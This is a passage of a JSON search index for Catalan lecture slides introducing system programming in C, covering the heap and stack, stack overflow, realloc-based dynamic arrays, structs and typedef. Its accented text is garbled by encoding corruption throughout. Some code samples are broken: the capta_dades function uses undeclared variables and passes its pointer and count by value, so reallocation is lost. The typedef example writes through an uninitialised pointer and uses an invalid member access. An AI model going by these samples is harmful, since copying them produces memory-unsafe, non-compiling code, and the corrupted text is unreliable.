    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Qu√® √©s la Heap?",
    "text": "Qu√® √©s la Heap?\nLa heap √©s una √†rea de mem√≤ria on s‚Äôassigna mem√≤ria de manera din√†mica durant el temps d‚Äôexecuci√≥. Aquesta mem√≤ria es gestiona a trav√©s de funcions espec√≠fiques com malloc(), calloc() i free(), i √©s responsabilitat del programador garantir que la mem√≤ria s‚Äôalliberi quan ja no sigui necess√†ria.\nCaracter√≠stiques de la Heap\n\nGesti√≥ manual: El programador ha de controlar l‚Äôassignaci√≥ i alliberament de la mem√≤ria.\nFlexibilitat: √âs √∫til per a grans blocs de mem√≤ria o per a objectes que han de romandre en mem√≤ria m√©s temps que una funci√≥ espec√≠fica.\nLimitaci√≥ per mem√≤ria f√≠sica: La mida de la heap est√† limitada per la quantitat de mem√≤ria f√≠sica disponible al sistema.\nCost d‚Äôexecuci√≥: Les operacions amb la heap s√≥n m√©s lentes comparades amb la pila, a causa de la gesti√≥ din√†mica i la fragmentaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-heap-vs-stack",
    "href": "slides/01-c.html#exemple-heap-vs-stack",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Exemple: Heap vs Stack",
    "text": "Exemple: Heap vs Stack\n\n\nint main() {     \n    int y;   \n    char *str; \n    y = 4;\n    printf(\"stack memory: %d\\n\", y);\n    str = malloc(100*sizeof(char)); \n    str[0] = 'm';\n    printf(\"heap memory:%c\\n\", str[0]); \n    free(str);         \n    return 0;\n}\n\n\n\n\nFitxer: sources/zones_mem.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#stackoverflow",
    "href": "slides/01-c.html#stackoverflow",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "StackOverflow",
    "text": "StackOverflow\n\n\nExemple\nvoid func() {\n    int vector[1000];\n    func();\n}\n\nint main() {\n    func();\n    return 0;\n}\n\nQu√® √©s un StackOverflow?\nUn stack overflow es produeix quan la pila del programa supera la seva capacitat m√†xima. Aix√≤ pot passar quan es criden funcions recursives de manera infinita o quan s‚Äôassignen grans quantitats de mem√≤ria a la pila.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-ordenar-amb-mem√≤ria-din√†mica-i",
    "href": "slides/01-c.html#exemple-ordenar-amb-mem√≤ria-din√†mica-i",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Exemple: Ordenar amb mem√≤ria din√†mica (I)",
    "text": "Exemple: Ordenar amb mem√≤ria din√†mica (I)\nint main() {\n    int* nums = NULL;  \n    int n = 0, max_elements = 10, num;\n\n    nums = (int*)malloc(max_elements * sizeof(int));\n    if (nums == NULL) {\n        printf(\"Error en l'assignaci√≥ de mem√≤ria.\\n\");\n        return 1;\n    }\n\n    capta_dades(n, nums);\n    ordenar(n, nums);\n    free(nums);\n    return 0;\n}\n\nFitxer: sources/pas_referencia.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-ordenar-amb-mem√≤ria-din√†mica-ii",
    "href": "slides/01-c.html#exemple-ordenar-amb-mem√≤ria-din√†mica-ii",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Exemple: Ordenar amb mem√≤ria din√†mica (II)",
    "text": "Exemple: Ordenar amb mem√≤ria din√†mica (II)\n\ncapta_dades(int n, int* nums) {\n  while (scanf(\"%d\", &num) != EOF) {\n    if (n &gt;= max_elements) {\n      max_elements *= 2;\n      int* temp = (int*)realloc(nums, max_elements * sizeof(int));\n      if (temp == NULL) {\n        printf(\"Error en l'assignaci√≥ de mem√≤ria.\\n\");\n        free(nums);\n        return 1;\n      }\n      nums = temp;\n    }\n  nums[n] = num;\n  n++;\n  }\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#qu√©-s√≥n-els-structs",
    "href": "slides/01-c.html#qu√©-s√≥n-els-structs",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Qu√© s√≥n els structs?",
    "text": "Qu√© s√≥n els structs?\nUna estructura √©s un tipus de dades derivats format per membres que s√≥n tipus de dades fonamentals o derivats. Una √∫nica estructura emmagatzemaria les dades d‚Äôun objecte. Una matriu d‚Äôestructures emmagatzemaria les dades de diversos objectes.\n\n\nSenser reserva espai de Mem√≤ria\nstruct user {\nint pid;\nchar * name;\n}\n\nReservant espai de Mem√≤ria\nstruct user {\nint pid;\nchar * name;\n} user;",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#qu√©-s√≥n-els-typedef",
    "href": "slides/01-c.html#qu√©-s√≥n-els-typedef",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Qu√© s√≥n els Typedef?",
    "text": "Qu√© s√≥n els Typedef?\nTypedef s‚Äôutilitza per crear sin√≤nims per a noms de tipus de dades definits pr√®viament.\n\n\ntypedef int L;\nint a;\nL a;\n\ntypedef struct {\nint pid;\nchar * name;\n} User; \n\n\n\n\nUser user;\nuser.name=\"\nJordi Mateo\";\nuser.pid=5000;\n\nUser * user1;\nuser1-&gt;name=\"Jack \nsparrow\";\n*(user1).pid=5001;\nUser *user2 = &user;",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#calculant-la-distancia-entre-2-punts",
    "href": "slides/01-c.html#calculant-la-distancia-entre-2-punts",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Calculant la distancia entre 2 punts",
    "text": "Calculant la distancia entre 2 punts\ntypedef struct {\n  float x; float y;\n} point ;\n \nfloat dist( point A, point B) {\n  return(sqrt((A.x - B.x)*(A.x - B.x) + (A.y - B.y)*(A.y - B.y)));\n}\n \nint main(){\n  float d; point A, B;\n  printf(\"The coordinates of the point A are: \");\n  scanf(\"%f %f\",&A.x,&A.y);\n  printf(\"\\nThe coordinates of the point B are: \");\n  scanf(\"%f %f\",&B.x,&B.y);\n  printf(\"\\nThe distance between A and B is %f\\n\", dist(A,B));\n  exit (0);\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exercicis",
    "href": "slides/01-c.html#exercicis",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Exercicis",
    "text": "Exercicis\n\nDebianBin",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#aix√≤-√©s-tot-per-avui",
    "href": "slides/01-c.html#aix√≤-√©s-tot-per-avui",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Aix√≤ √©s tot per avui",
    "text": "Aix√≤ √©s tot per avui\n\n\nPreguntes?\nTot el codi i exemples addicionals els trobareu a la carpeta 01-sources del repositori GitHub del curs.\n\nTAKE HOME MESSAGE\nEl kernel de Linux s‚Äôha escrit en C, per tant, √©s important con√®ixer aquest llenguatge de programaci√≥ si volem entendre com funciona el sistema operatiu.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  }
]